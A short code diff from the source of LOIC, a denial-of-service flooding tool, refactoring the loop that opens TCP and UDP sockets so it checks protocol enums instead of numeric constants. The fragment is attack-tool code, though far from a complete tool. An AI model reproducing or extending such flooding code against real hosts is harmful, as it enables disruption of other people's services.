@@ -52,7 +52,7 @@ namespace LOIC
 				while (this.IsFlooding)
 				{
 					State = ReqState.Ready; // SET STATE TO READY //
-					if(Protocol == 1)
+					if(Protocol == (int)Protocol.TCP)
 					{
 						using (Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
 						{
@@ -78,7 +78,7 @@ namespace LOIC
 							catch { Failed++; }
 						}
 					}
-					if(Protocol == 2)
+					if(Protocol == (int)Protocol.UDP)
 					{
 						using (Socket socket = new Socket(RHost.AddressFamily, SocketType.Dgram, ProtocolType.Udp))
 						{
